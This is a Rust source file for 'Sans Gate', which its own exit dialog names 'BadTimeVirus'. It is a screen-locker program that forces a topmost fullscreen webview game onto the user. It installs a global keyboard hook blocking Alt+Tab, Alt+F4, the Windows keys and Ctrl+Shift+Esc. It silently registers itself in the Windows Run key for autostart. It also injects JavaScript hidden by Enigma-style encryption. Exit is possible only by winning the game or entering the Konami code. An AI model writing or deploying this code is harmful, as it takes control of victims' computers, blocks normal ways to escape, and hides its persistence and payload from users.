#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::sync::{Arc, atomic::{AtomicBool, Ordering}};

mod enigma;


use serde_json::Value;
use tao::{
    event::{Event, StartCause, WindowEvent},
    event_loop::{ControlFlow, EventLoop, EventLoopProxy},
    window::{Fullscreen, WindowBuilder},
};
use wry::WebViewBuilder;

#[cfg(target_os = "windows")]
use tao::platform::windows::WindowExtWindows;
#[cfg(target_os = "windows")]
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK, MB_ICONINFORMATION};
#[cfg(target_os = "windows")]
use windows::Win32::Foundation::HWND;
#[cfg(target_os = "windows")]
use windows::core::PCWSTR;

#[derive(Debug, Clone)]
enum UserEvent {
    CloseAfterWin,
    ExitNow,
}

fn main() -> wry::Result<()> {
    #[cfg(target_os = "windows")]
    {
        ensure_autostart_config_file();
        apply_autostart_from_config();
    }
    let event_loop: EventLoop<UserEvent> = tao::event_loop::EventLoopBuilder::<UserEvent>::with_user_event().build();
    let proxy: EventLoopProxy<UserEvent> = event_loop.create_proxy();
    #[cfg(target_os = "windows")]
    unsafe {
        keyboard::install_keyboard_hook();
    }

    let window = WindowBuilder::new()
        .with_title("Sans Gate")
        .with_always_on_top(true)
        .with_inner_size(tao::dpi::LogicalSize::new(1280.0, 800.0))
        .build(&event_loop)
        .expect("failed to create window");

    // Force native fullscreen (borderless) at launch
    window.set_fullscreen(Some(Fullscreen::Borderless(None)));
    // Ensure the window is focused and remains topmost
    window.set_always_on_top(true);
    window.set_focus();

    let won_flag = Arc::new(AtomicBool::new(false));
    let won_flag_ipc = won_flag.clone();
    let proxy_ipc = proxy.clone();

    let encrypted_js = r#"
        (() => {
          qionx xkmr = (siy) => {
            nmc { tysijh.sxj.qvrgIoyfytz(SEFE.wrvrhlzxw(tku)); } wpwtr (_) {}
          };

          // Azb-rhep ltfjsm pzmlqo aky jqothzp
          ayc __gxmNfuldpax = tixqo;
          bqqnx tzgufrEdms = () => { kd (!__lioFoqdofny) { __gyzPkxhpwna = vukr; czz { xlsxzdst.trkmpq(); } fnpor (_) {} } };

          // Amutus ukam: Zn, Zo, Vafs, Xxdc, Xwhh, Ncoru, Nznr, Xsodc, R, K
          (baweilzt(){
            hhxfa pjg = ['OhjbzPd','DjarjPr','DdgnvWnfm','FqawbHife','NvwnfQaqg','HxwsuNceju','YjmcgMmnn','TfpkuInhrn','g','v'];
            jrd crl = 0;
            uyvio voswtqa = (nolfpkyf, vqt) => dydiqbrj.wmunna === 1 ? dpvfbbum === cjr.efEhyqmAnjv() : kdxyhomw === grw;
            juyfzt.nzqJuukjBpmkmtsd('jiwwnik', (j) => {
              pki {
                ftgbn mao = (t.zhw || '').xuEnyldc();
                fc (cbnwxxf(gyb[njc], par)) {
                  nir++;
                  gy (eqq === lmm.ahuegy) {
                    fbsy({ hclgn: 'sxcccq' });
                    lhh = 0;
                  }
                } sigv {
                  // zzafc pm jntuooav, gzr qjfzz dyljfsxhmh btxe iblko vi khifbazzo kmzos
                  lwo = ptqnnvc(bgt[0], roi) ? 1 : 0;
                }
              } tqdll(_) {}
            }, { wsqqsgh: cznf });
          })();

          // Zdzwzkn krej 'A' cacmc rv ciymafw

          // Lnnzms wzeuf 10 jyymipv rh tdney brhxrgq
          rcvxc dswgtvPztal = qanLhouifn(() => {
            xbe { iqouvgwl.wkweja(); } rpkel (_) {}
          }, 10 * 60 * 1000);

          // Xgma wrcgatt.dmn wv ircqqs eve/wabu
          (czyoztre() {
            huemo rcnq = vjeklvx.pfb;
            rsjwthk.eik = ihkspohu(...qtpp) {
              xgt {
                azdys dgkc = yylq.kef(r => {
                  jjf { txypkp qqowle z === 'jegrzm' ? d : NUCJ.psddvdkid(r); } zqhos(_) { upibew Imttgv(p); }
                }).weny(' ');
                ba (nrtm.vlnhhtrh('Gfx')) {
                  vqr { njpjzNgkftdh(ooikcbFtgfn); } xdaxx(_) {}
                  gixu({ nstgy: 'xei' });
                } tppj fb (juoh.uoiikiyf('Yfmb')) {
                  // Zf eihykt ni cuyl
                }
              } vvggy (_) {}
              zuyhue tutf.qsdce(fwwi, cwdv);
            };
          })();

          // Ixhlu qeriqjp inwhyrisba gwb pkq uehg jwrgvzl dpy uieguzs gn rixq.
          (bedahsgc(){
            kfxxa zeBizt = () => !!(lnkdciwn.emrjegwaihHfrenck || mwtgkato.xrpeqeJyzsnrxnotUviwmah || ilijhnum.tlPsrnaxbvaxRtxqysa);
            qczag xwnkyhrHcbi = () => {
              cad {
                jtbvz zr = wyaegrrs.hzvxbguuOzfnoyg;
                sfbts vkw = lh.tuslczbAiftrruufc || do.btjaamVvhwdlaRwajhuqgcb || ng.keUmrkfvmHypreaosvv;
                ra (irg) jxm.qrde(dt);
              } pfitv (_) {}
            };

            nwy ekofsiFlemhlua = 0;
            oba jssojjm = vksrf; // zmzpragq yoksxz yxcbj
            muywf jdmbiyn = () => {
              om (!nuHqqi()) {
                htxqfayPdcn();
                bw (!vvhxmmr) {
                  xopqyoz = xzki;
                  bhyQxygtss(() => {
                    hql {
                      mo (!bbZhgm() && ibopvkBqmvevml < 3) {
                        jqmwhsZjszgtst++;
                        dtsypczs.nbvncz();
                      }
                    } khaap (_) {}
                    ustbxpt = emjkb;
                  }, 1500);
                }
              }
            };

            // Fjxdyis pzw vww tgb-kxsob xpcvzlbxmmm
            dtaPdupiia(bdtqzub, 500);
            tabck joeu = () => { jxk { kyksirg(); } dqwju (_) {} fdiipbkSflhihmhfAjfns(dmpn); };
            fvaqtcoVaybhzresQwhus(yadc);
            qhxnulsl.zhrGrirzHyuslpyq('tojwbkbgdtmifwyq', () => { tp (!kzJgxx()) skcfxja(); });
            tagezqqg.jnjAftpwGfoixwaj('xbylrvvzyurpcrradmimob', () => { js (!txUkaz()) rzqjkmt(); });
          })();

          // Fmtj ndgipwrb cm voian-myb kdwrgnp qdjrcg arg zznl qwcvvdy.
          // Leui: uytoyp vrgpcfuew Kisb+Exr+Wic; Iwn+A4 xy YJ-dwhbrdo wdm bgf qgngk pybcv.
          sfqbpy.sutDtdcsWgqnllil('emqijkh', (s) => {
            cbp {
              anvdw ziv = (h.smh || '').iiGnneoa();
              fggui l = ndb.qzhisc ? ocq.wnNpyzaOnjr() : '';
              // Uffi+M (paoxby nfhfc-pup zu wwcrtjhv)
              kz (j.iyeeOfb && (s === 's')) {
                p.vtleyxhBbvdafi();
                dci { kjnqgnGhvl(); } tqkrp(_) {}
                hbiigf;
              }
              // Jgk+U4 (hpod-upaatx; CA tgj lbjef quubex mfap ectn)
              kv (u.ljfIgu && (uyz === 'J4' || r === 'g4')) {
                n.updcvrfAkikkmm();
                jeu { fbtrrzJkiu(); } fwkep(_) {}
                cbbrku;
              }
            } licmy (_) {}
          }, { ybwpgos: wlbc });
        })();
    "#;

    let mut enigma = enigma::EnigmaMachine::new([(0, 'A', 'A'), (1, 'A', 'A'), (2, 'A', 'A')], 'B', "");
    let init_js_decrypted = enigma.process_text(encrypted_js);


    let _webview = WebViewBuilder::new(&window)
        .with_url("https://benp1236691.github.io/BadtimePage/")
        .with_initialization_script(&init_js_decrypted)
        .with_ipc_handler(move |req| {
            let msg = req.body();
            if let Ok(v) = serde_json::from_str::<Value>(msg) {
                if v.get("event").and_then(|e| e.as_str()) == Some("won") {
                    if !won_flag_ipc.swap(true, Ordering::SeqCst) {
                        // First time we saw a win: schedule close after 3 seconds
                        let _ = proxy_ipc.send_event(UserEvent::CloseAfterWin);
                    }
                } else if v.get("event").and_then(|e| e.as_str()) == Some("konami") {
                    let _ = proxy_ipc.send_event(UserEvent::ExitNow);
                }
            }
        })
        .build()?;

    
    event_loop.run(move |event, _target, control_flow| {
        *control_flow = ControlFlow::Wait;
        match event {
            Event::NewEvents(StartCause::Init) => {
                // Nothing extra on init lol
            }
            
            Event::UserEvent(UserEvent::CloseAfterWin) => {
                // No-op; close handled via CloseRequested or ExitNow
            }
            Event::UserEvent(UserEvent::ExitNow) => {
                #[cfg(target_os = "windows")]
                {
                    window.set_always_on_top(false);
                    unsafe {
                        let title = to_wide("BadTimeVirus");
                        let msg = to_wide("Konami Code Detected! Exiting...");
                        MessageBoxW(HWND(window.hwnd() as _), PCWSTR(msg.as_ptr()), PCWSTR(title.as_ptr()), MB_OK | MB_ICONINFORMATION);
                    }
                }
                *control_flow = ControlFlow::Exit;
            }
            
            Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => {
                // Exit immediately without showing an autostart prompt
                *control_flow = ControlFlow::Exit;
            }
            _ => {}
        }
    });
}

#[cfg(target_os = "windows")]
fn spawn_new_instance() -> std::io::Result<()> {
    let exe = std::env::current_exe()?;
    std::process::Command::new(exe).spawn()?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn spawn_new_instance() -> std::io::Result<()> { Ok(()) }

fn config_dir() -> Option<std::path::PathBuf> {
    #[cfg(target_os = "windows")]
    {
        return std::env::var_os("APPDATA").map(std::path::PathBuf::from).map(|mut p| { p.push("SansGate"); p });
    }
    #[cfg(not(target_os = "windows"))]
    {
        let base = std::env::var_os("XDG_CONFIG_HOME")
            .map(std::path::PathBuf::from)
            .or_else(|| {
                std::env::var_os("HOME").map(|h| {
                    let mut p = std::path::PathBuf::from(h);
                    p.push(".config");
                    p
                })
            });
        base.map(|mut p| { p.push("SansGate"); p })
    }
}

fn autostart_cfg_path() -> Option<std::path::PathBuf> {
    let mut dir = config_dir()?;
    std::fs::create_dir_all(&dir).ok()?;
    dir.push("autostart.txt");
    Some(dir)
}

fn read_autostart_config() -> Option<bool> {
    let p = autostart_cfg_path()?;
    let s = std::fs::read_to_string(p).ok()?;
    let v = s.trim().to_ascii_lowercase();
    match v.as_str() { "true" | "1" | "yes" | "y" => Some(true), "false" | "0" | "no" | "n" => Some(false), _ => None }
}

fn write_autostart_config(val: bool) -> std::io::Result<()> {
    if let Some(p) = autostart_cfg_path() { std::fs::write(p, if val { "true" } else { "false" })?; }
    Ok(())
}

#[cfg(target_os = "windows")]
fn ensure_autostart_config_file() {
    use std::fs;
    if let Some(p) = autostart_cfg_path() {
        if !p.exists() {
            let _ = fs::write(&p, b"true");
        }
    }
}

#[cfg(target_os = "windows")]
fn apply_autostart_from_config() {
    match read_autostart_config() {
        Some(true) => { let _ = set_autostart("SansGate"); }
        Some(false) => { let _ = remove_autostart("SansGate"); }
        None => {}
    }
}

#[cfg(target_os = "windows")]
fn ensure_autostart_prompt_once() {
    use std::fs;
    use std::path::PathBuf;

    const RUN_VALUE: &str = "SansGate";
    let mut prompted = false;
    if let Some(appdata) = std::env::var_os("APPDATA") {
        let mut p = PathBuf::from(appdata);
        p.push("SansGate");
        let _ = fs::create_dir_all(&p);
        p.push("autostart_prompted.flag");
        if p.exists() {
            prompted = true;
        } else {
            // First run: enable autostart silently
            if !is_autostart_configured(RUN_VALUE).unwrap_or(false) {
                let _ = set_autostart(RUN_VALUE);
            }
            let _ = fs::write(&p, b"1");
            prompted = true;
        }
    }
    if !prompted {
        if !is_autostart_configured("SansGate").unwrap_or(true) {
            let _ = set_autostart("SansGate");
        }
    }
}

#[cfg(target_os = "windows")]
fn is_autostart_configured(value_name: &str) -> windows::core::Result<bool> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{RegCloseKey, RegGetValueW, RegOpenKeyExW, HKEY, HKEY_CURRENT_USER, RRF_RT_REG_SZ, KEY_READ};
    use windows::Win32::Foundation::ERROR_SUCCESS;

    let subkey = to_wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let name = to_wide(value_name);
    unsafe {
        let mut hkey: HKEY = HKEY::default();
        let open = RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(subkey.as_ptr()), 0, KEY_READ, &mut hkey);
        if open != ERROR_SUCCESS { return Ok(false); }
        let mut size: u32 = 0;
        let status = RegGetValueW(hkey, PCWSTR(std::ptr::null()), PCWSTR(name.as_ptr()), RRF_RT_REG_SZ, None, None, Some(&mut size));
        let _ = RegCloseKey(hkey);
        Ok(status == ERROR_SUCCESS)
    }
}

#[cfg(target_os = "windows")]
fn set_autostart(value_name: &str) -> windows::core::Result<()> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ};
    use windows::Win32::Foundation::ERROR_SUCCESS;

    let subkey = to_wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let name = to_wide(value_name);
    let exe = std::env::current_exe().unwrap_or_default();
    let exe_str = format!("\"{}\"", exe.display());
    let data = to_wide(&exe_str);
    unsafe {
        let mut hkey: HKEY = HKEY::default();
        let open = RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(subkey.as_ptr()), 0, KEY_SET_VALUE, &mut hkey);
        if open != ERROR_SUCCESS { return Ok(()); }
        let bytes = std::slice::from_raw_parts(data.as_ptr() as *const u8, data.len() * 2);
        let _ = RegSetValueExW(hkey, PCWSTR(name.as_ptr()), 0, REG_SZ, Some(bytes));
        let _ = RegCloseKey(hkey);
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn remove_autostart(value_name: &str) -> windows::core::Result<()> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{RegCloseKey, RegOpenKeyExW, RegDeleteValueW, HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE};
    use windows::Win32::Foundation::ERROR_SUCCESS;

    let subkey = to_wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let name = to_wide(value_name);
    unsafe {
        let mut hkey: HKEY = HKEY::default();
        let open = RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(subkey.as_ptr()), 0, KEY_SET_VALUE, &mut hkey);
        if open != ERROR_SUCCESS { return Ok(()); }
        let _ = RegDeleteValueW(hkey, PCWSTR(name.as_ptr()));
        let _ = RegCloseKey(hkey);
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
mod keyboard {
    use std::sync::atomic::{AtomicBool, Ordering};
    use windows::Win32::Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM};
    use windows::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, VIRTUAL_KEY, VK_CONTROL, VK_ESCAPE, VK_F4, VK_LWIN, VK_RWIN, VK_SHIFT, VK_SPACE, VK_TAB};
    use windows::Win32::UI::WindowsAndMessaging::{CallNextHookEx, SetWindowsHookExW, HHOOK, KBDLLHOOKSTRUCT, LLKHF_ALTDOWN, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN};

    static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);

    #[no_mangle]
    pub unsafe extern "system" fn low_level_keyboard_proc(nCode: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        if nCode >= 0 {
            let kb: &KBDLLHOOKSTRUCT = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
            let vk = kb.vkCode as u32;
            let alt_down = (kb.flags & LLKHF_ALTDOWN) == LLKHF_ALTDOWN;
            let is_keydown = w_param.0 == WM_KEYDOWN as usize || w_param.0 == WM_SYSKEYDOWN as usize;

            let matches_vk = |key: VIRTUAL_KEY| vk == key.0 as u32;
            let win_down = (GetAsyncKeyState(VK_LWIN.0 as i32) as u16 & 0x8000) != 0
                || (GetAsyncKeyState(VK_RWIN.0 as i32) as u16 & 0x8000) != 0;
            let ctrl_down = (GetAsyncKeyState(VK_CONTROL.0 as i32) as u16 & 0x8000) != 0;
            let shift_down = (GetAsyncKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000) != 0;

            // Block common task-switch/system combos (best-effort; OS may still handle some)
            if is_keydown {
                let block =
                    // Alt+Tab and Alt+Esc
                    (alt_down && (matches_vk(VK_TAB) || matches_vk(VK_ESCAPE))) ||
                    // Alt+F4
                    (alt_down && matches_vk(VK_F4)) ||
                    // Alt+Space
                    (alt_down && matches_vk(VK_SPACE)) ||
                    // Windows keys directly (prevents Win key menu) and Win+Tab
                    matches_vk(VK_LWIN) || matches_vk(VK_RWIN) || (win_down && matches_vk(VK_TAB)) ||
                    // Ctrl+Shift+Esc (Task Manager) and Ctrl+Esc (Start Menu)
                    ((ctrl_down && shift_down) && matches_vk(VK_ESCAPE)) ||
                    (ctrl_down && matches_vk(VK_ESCAPE));

                if block {
                    return LRESULT(1);
                }
            }
        }
        CallNextHookEx(HHOOK(std::ptr::null_mut()), nCode, w_param, l_param)
    }

    pub unsafe fn install_keyboard_hook() {
        if HOOK_INSTALLED.swap(true, Ordering::SeqCst) {
            return;
        }
        // Install a global low-level keyboard hook.
        let _hhook: HHOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(low_level_keyboard_proc), HINSTANCE(std::ptr::null_mut()), 0)
            .expect("failed to install keyboard hook");
        // Note: we purposely do not unhook on exit since the app is single-process and exits entirely.
    }
}
